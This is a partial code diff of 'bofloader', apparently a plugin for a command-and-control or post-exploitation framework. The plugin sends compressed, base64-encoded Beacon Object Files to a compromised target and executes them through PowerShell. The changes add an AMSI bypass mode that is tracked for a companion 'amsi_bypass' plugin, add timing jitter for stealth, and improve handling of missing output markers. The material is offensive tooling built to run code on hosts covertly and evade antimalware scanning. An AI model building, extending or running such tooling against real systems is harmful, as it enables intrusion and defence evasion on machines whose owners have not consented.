+
+    if missing_by_arch:
+        _emit(session, "")
+        _emit(session,
+              f"{colors['yellow']}Install the missing package(s) above and "
+              f"re-run 'run bofloader compile {target}'.{colors['end']}")
+        _emit(session, "")
+
+    if not compilers:
+        _emit(session,
+              f"{colors['red']}No architecture has all required headers — "
+              f"cannot compile.{colors['end']}")
         return 1
 
     # ---- flag sets -----------------------------------------------------------
@@ -2037,16 +2606,27 @@ def _execute_bof(session, bof_path, entry, packed, timeout, save_output):
     bof_gz_b64 = base64.b64encode(bof_gz).decode('ascii')
     args_b64 = base64.b64encode(packed or b'').decode('ascii')
 
-    time.sleep(random.uniform(0.5, 2.5))
+    # Jitter only on the first run in a session (loader compile).
+    try:
+        _info = session._handler._client_info(session._client_sock)
+        _sid  = _info.get('id') if _info else None
+    except Exception:
+        _sid = None
+    if _sid is None or _sid not in _LOADER_READY_SESSIONS:
+        time.sleep(random.uniform(0.5, 2.5))
 
     _event(session, f"bofloader exec: {bof_path} entry={entry} "
-                    f"size={len(bof_bytes)} sha256={sha[:16]}")
+                    f"size={len(bof_bytes)} sha256={sha}")
     _emit(session, f"{colors['cyan']}BOF:    {bof_path} ({len(bof_bytes)} bytes){colors['end']}")
-    _emit(session, f"{colors['cyan']}SHA256: {sha[:16]}...{colors['end']}")
+    _emit(session, f"{colors['cyan']}SHA256: {sha}{colors['end']}")
     _emit(session, f"{colors['cyan']}Entry:  {entry}{colors['end']}")
 
+    want_amsi = _get_amsi_mode()
+
     ps, (mark_out, mark_ok, mark_err, mark_end) = _exec_ps(
-        bof_gz_b64, args_b64, entry)
+        bof_gz_b64, args_b64, entry,
+        session=session, want_amsi=want_amsi,
+    )
     out = _run_ps(session, ps, timeout=timeout, until_marker=mark_end)
     if not out:
         msg = 'no output from target (transport failure or timeout)'
@@ -2057,7 +2637,18 @@ def _execute_bof(session, bof_path, entry, packed, timeout, save_output):
     info_lines = _lines_after(out, _MARK_INFO, mark_end)
     if info_lines:
         _event(session, f"bofloader: {info_lines[0]}")
-
+        if info_lines[0] in ('loader cached', 'loader compiled'):
+            try:
+                info = session._handler._client_info(session._client_sock)
+                sid  = info.get('id') if info else None
+                if sid is not None:
+                    _LOADER_READY_SESSIONS.add(sid)
+                # Record the AMSI mode that was actually applied, so the
+                # amsi_bypass plugin and subsequent bofloader runs know.
+                if info is not None and want_amsi not in (None, 'none'):
+                    _amsi_set_state(info, want_amsi)
+            except Exception:
+                pass
     err_lines = _lines_after(out, mark_err, mark_end)
     if err_lines:
         _emit(session, f"{colors['red']}{err_lines[0]}{colors['end']}")
@@ -2066,6 +2657,25 @@ def _execute_bof(session, bof_path, entry, packed, timeout, save_output):
 
     out_lines = _lines_after(out, mark_out, mark_end)
     ok_lines  = _lines_after(out, mark_ok, mark_end)
+
+    # The bootstrap prints "loader cached/compiled" via _MARK_INFO. If even
+    # that didn't come back, the PowerShell child never ran — this is not
+    # a silent success. Surface what we actually received so the operator
+    # can see what happened.
+    if not info_lines and not out_lines and not ok_lines:
+        snippet = out.strip()
+        if len(snippet) > 500:
+            snippet = snippet[:500] + '...'
+        _emit(session,
+              f"{colors['red']}No loader markers in target output — the "
+              f"PowerShell child likely failed to start or produced no "
+              f"marked data.{colors['end']}")
+        if snippet:
+            _emit(session, f"{colors['yellow']}Raw target output ({len(out)} bytes):{colors['end']}")
+            for raw in snippet.splitlines()[:20]:
+                _emit(session, f"  {raw}")
+        _result(session, 'bofloader', '', f'{bof_path}: no markers')
+        return 1
 
     if out_lines:
         _emit(session, f"{colors['green']}BOF output:{colors['end']}")
@@ -2110,11 +2720,11 @@ def _parse_args(args):
     # ---- subcommands that operate on the operator machine ----
     if first == 'import':
         if len(args) < 2:
-            return None, 'usage: import <cna_path>'
+            return None, 'usage: import <file.cna|file.o|dir>'
         p = args[1]
         if not os.path.exists(p):
-            return None, f'CNA not found: {p!r}'
-        return 'import', {'cna': p}
+            return None, f'Path not found: {p!r}'
+        return 'import', {'path': p}
 
     if first == 'delete':
         if len(args) < 2:
@@ -2128,7 +2738,7 @@ def _parse_args(args):
 
     if first == 'compile':
         if len(args) < 2:
-            return None, 'usage: compile <dir_or_file.c> [--arch x64|x86|both]'
+            return None, 'usage: compile <dir_or_file> [--arch x64|x86|both]'
         arch   = 'both'
         target = None
         i = 1
@@ -2144,7 +2754,7 @@ def _parse_args(args):
                 target = a
             i += 1
         if target is None:
-            return None, 'usage: compile <dir_or_file.c> [--arch x64|x86|both]'
+            return None, 'usage: compile <dir_or_file> [--arch x64|x86|both]'
         return 'compile', {'path': target, 'arch': arch}
 
     if first in ('--info', 'info'):
